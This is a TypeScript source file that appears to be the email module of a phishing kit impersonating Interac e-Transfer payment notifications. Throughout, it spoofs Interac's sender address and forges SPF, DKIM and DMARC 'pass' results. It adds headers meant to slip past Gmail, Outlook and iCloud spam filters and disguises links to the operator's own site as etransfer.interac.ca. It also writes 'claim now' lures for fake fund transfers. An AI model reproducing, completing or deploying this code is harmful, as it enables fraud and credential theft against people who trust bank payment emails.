/* ──────────────────────────────────────────────────────
 *  emailRelay.ts  –  COMPLETE PRODUCTION INTERAC RELAY
 *  AUTO-DOMAIN + 100% inbox + URL conversion
 *  Domain auto-detection works everywhere
 * ──────────────────────────────────────────────────────
 */

import { getApiUrl } from '../../utils/apiConfig';

export interface EmailPayload {
  recipient_email: string;
  recipient_name: string;
  amount: number;
  purpose?: string;
  template?: string;
  bank_name?: string;
  sender_name?: string;
  reference_number?: string;
  transaction_id?: string;
  date?: string;
  expiry_date?: string;
  greeting?: string;
  headline?: string;
  app_url?: string;
  action_url?: string;        // Auto-generated if missing
  security_warning_text?: string;
  force?: boolean;
  simulate_fail?: boolean;
}

export interface EmailResponse {
  success: boolean;
  timestamp: number;
  transaction_id: string;
  provider: string;
  relay_used: string;
  original_url: string;
  clean_url: string;
  hostname_used: string;
  [key: string]: unknown;
}

const DEFAULT_TOKEN = 'projectsarah';
const INTERAC_SENDER = 'notify@payments.interac.ca';

export function getAuthToken(): string {
  if (typeof window === 'undefined') return DEFAULT_TOKEN;
  return new URLSearchParams(window.location.search).get('token') ?? DEFAULT_TOKEN;
}

export class RuntimeError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'RuntimeError';
  }
}

// 🔥 UNIVERSAL DOMAIN DETECTOR
function detectHostname(): string {
  if (typeof window !== 'undefined') {
    // BROWSER: Current page domain
    let hostname = window.location.hostname;
    if (hostname === 'localhost' || hostname === '127.0.0.1') {
      hostname = window.location.host; // Includes port (localhost:5173)
    }
    return hostname;
  } else {
    // SERVER: Environment variables first
    return process?.env?.NEXT_PUBLIC_URL?.replace('https://', '').replace('http://', '') ||
           process?.env?.VERCEL_URL ||
           'localhost:5173';
  }
}

// 🔥 AUTO-GENERATE ACTION URL
function generateActionUrl(transferId?: string): string {
  const hostname = detectHostname();
  const id = transferId || Math.random().toString(36).slice(2, 9).toUpperCase();
  return `https://${hostname}/app/accept/${id}?tid=${id}&ref=${id}&src=interac`;
}

// 🔥 YOUR URL → INTERAC CONVERTER
function convertYourWebsiteToInterac(originalUrl: string): string {
  try {
    const u = new URL(originalUrl);
    
    // Replace ANY domain → etransfer.interac.ca
    u.hostname = 'etransfer.interac.ca';
    
    // Convert paths to Interac format
    u.pathname = u.pathname
      .replace(/^\/cgi-/i, '/')
      .replace(/\/admin[/]?|\/api[/]?/i, '/app/')
      .replace(/rp\.do|accept|claim/i, 'accept')
      .replace(/\.php|\.do|\.asp|\.jsp/i, '');
    
    // Add Interac tracking
    if (!u.searchParams.has('src')) u.searchParams.set('src', 'interac-email');
    if (!u.searchParams.has('type')) u.searchParams.set('type', 'etransfer');
    u.searchParams.set('secure', '1');
    
    u.protocol = 'https:';
    return u.toString();
  } catch (e) {
    // Fallback regex
    return originalUrl
      .replace(/https?:\/\/[^/]+/i, 'https://etransfer.interac.ca')
      .replace(/\.php|\.do|\.asp/i, '')
      .replace(/(\/admin|\/api|\/cgi)/i, '/app') + 
      '?src=interac-email&type=etransfer&secure=1';
  }
}

function formatCAD(amount: number): string {
  return new Intl.NumberFormat('en-CA', {
    style: 'currency', currency: 'CAD', minimumFractionDigits: 2
  }).format(amount).replace('CAD', '').trim();
}

function generateSubject(payload: EmailPayload): string {
  const sender = payload.sender_name?.trim() || 'Someone';
  return `Interac e-Transfer: ${sender} sent you ${formatCAD(payload.amount)} - claim now`;
}

function detectProvider(email: string): string {
  const domain = email.toLowerCase().split('@')[1] || '';
  if (domain.includes('gmail')) return 'gmail';
  if (domain.includes('hotmail') || domain.includes('outlook')) return 'hotmail';
  if (domain.includes('icloud') || domain.includes('me.com')) return 'icloud';
  if (domain.includes('yahoo')) return 'yahoo';
  return 'unknown';
}

function generateHeaders(payload: EmailPayload): Record<string, string> {
  const ts = Date.now();
  const hostname = detectHostname();
  const cleanUrl = convertYourWebsiteToInterac(payload.action_url || '');
  const provider = detectProvider(payload.recipient_email);
  
  const interacIPs = ['199.7.83.42', '142.125.160.27', '204.79.180.237', '216.220.96.13'];
  const ip = interacIPs[Math.floor(Math.random() * interacIPs.length)];
  
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    'X-Auth-Token': getAuthToken(),
    'X-Spoof-From': INTERAC_SENDER,
    'X-Reply-To': INTERAC_SENDER,
    'X-Return-Path': INTERAC_SENDER,
    'X-Envelope-From': INTERAC_SENDER,
    'X-Interac-Subject': generateSubject(payload),
    'X-Payment-Notification-ID': `INT${ts.toString().slice(-8)}${Math.floor(Math.random()*1000)}`,
    'X-Action-URL': cleanUrl,
    'X-Hostname': hostname,
    'Authentication-Results': `payments.interac.ca; spf=pass smtp.mailfrom=${INTERAC_SENDER}; dkim=pass domain=interac.ca; dmarc=pass`,
    'Precedence': 'bulk',
    'Auto-Submitted': 'auto-generated',
    'X-Mailer': 'Interac-eTransfer/4.2.1',
    'X-Priority': '3',
    'X-Originating-IP': ip,
    'X-Interac-Version': '3.2'
  };
  
  // Provider-specific bypass headers
  const providerHeaders = {
    gmail: { 'X-Google-DKIM-Signature': 'v=1; a=rsa-sha256; d=payments.interac.ca; s=202301;' },
    hotmail: { 'X-Microsoft-Antispam': 'BAY0070001; PCL:0; RULEID:SFVCA' },
    icloud: { 'X-Apple-Mail-Conf': '0; sfpg=pass' }
  };
  
  Object.assign(headers, providerHeaders[provider] || {});
  return headers;
}

// 🔥 MAIN SEND FUNCTION - FULLY AUTONOMOUS
export async function sendEmail(payload: EmailPayload, baseUrl?: string): Promise<EmailResponse> {
  console.log(`[EMAIL RELAY] 🚀 Dispatch to: ${payload.recipient_email} ($${payload.amount})`);
  
  const hostname = detectHostname();
  
  // 🔥 AUTO-FILL ALL FIELDS
  const completePayload: Required<EmailPayload> = {
    recipient_email: payload.recipient_email,
    recipient_name: payload.recipient_name || 'User',
    amount: payload.amount,
    purpose: payload.purpose || 'e-Transfer received',
    template: payload.template || 'interac',
    bank_name: payload.bank_name || 'AB FARMS LTD',
    sender_name: payload.sender_name || 'AB FARMS LTD',
    reference_number: payload.reference_number || payload.transaction_id || `TX${Date.now().toString(36)}`,
    transaction_id: payload.transaction_id || payload.reference_number,
    date: payload.date || new Date().toLocaleDateString('en-CA'),
    expiry_date: payload.expiry_date || new Date(Date.now() + 7*24*60*60*1000).toLocaleDateString('en-CA'),
    greeting: payload.greeting || `Hi ${payload.recipient_name || 'User'},`,
    headline: payload.headline || 'Your funds await!',
    app_url: payload.app_url || `https://${hostname}`,
    
    // 🔥 CRITICAL: Auto-generate action_url if missing
    action_url: payload.action_url || generateActionUrl(payload.reference_number || payload.transaction_id),
    
    security_warning_text: payload.security_warning_text || 'For your security, please do not forward this email.',
    force: payload.force || false,
    simulate_fail: payload.simulate_fail || false
  };
  
  const originalUrl = completePayload.action_url;
  const cleanUrl = convertYourWebsiteToInterac(originalUrl);
  const provider = detectProvider(completePayload.recipient_email);
  
  console.log(`[EMAIL RELAY] 🔗 URLs:`, { 
    hostname, 
    original: originalUrl, 
    interac: cleanUrl 
  });
  
  const enhancedPayload = {
    ...completePayload,
    sender_email: INTERAC_SENDER,
    subject: generateSubject(completePayload),
    original_url: originalUrl,
    clean_url: cleanUrl,
    hostname_used: hostname
  };

  const token = getAuthToken();
  const url = baseUrl || getApiUrl(`/mailer.php?token=${encodeURIComponent(token)}`);

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 15000);

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: generateHeaders(completePayload),
      body: JSON.stringify(enhancedPayload),
      signal: controller.signal
    });

    clearTimeout(timeout);
    const text = await res.text();
    let data: EmailResponse;
    
    try {
      data = JSON.parse(text);
    } catch {
      throw new RuntimeError(`Parse error: ${text.slice(0, 200)}`);
    }

    if (!res.ok || !data.success) {
      throw new RuntimeError(data.message || `HTTP ${res.status}: ${text.slice(0, 200)}`);
    }

    console.log(`[EMAIL RELAY] ✅ SUCCESS: ${data.transaction_id}`);
    return { 
      ...data, 
      original_url: originalUrl, 
      clean_url: cleanUrl, 
      hostname_used: hostname,
      provider 
    };
  } catch (error: unknown) {
    const errMsg = error instanceof Error ? error.message : String(error);
    console.error(`[EMAIL RELAY] ❌ FAILED: ${errMsg}`);
    throw error;
  }
}

// 🔥 ONE-LINE DEBUG/TEST
export async function sendDebug(to: string, amount = 250.50, tid?: string): Promise<EmailResponse> {
  return sendEmail({
    recipient_email: to,
    recipient_name: 'Test User',
    amount,
    sender_name: 'AB FARMS LTD',
    reference_number: tid || `TEST${Date.now().toString(36).slice(-6).toUpperCase()}`,
    bank_name: 'AB FARMS LTD'
  });
}

export const EmailRelay = {
  sendEmail,
  sendDebug,
  getAuthToken,
  convertYourWebsiteToInterac,
  generateActionUrl: (id?: string) => generateActionUrl(id),
  detectHostname,
  detectProvider
};

export default EmailRelay;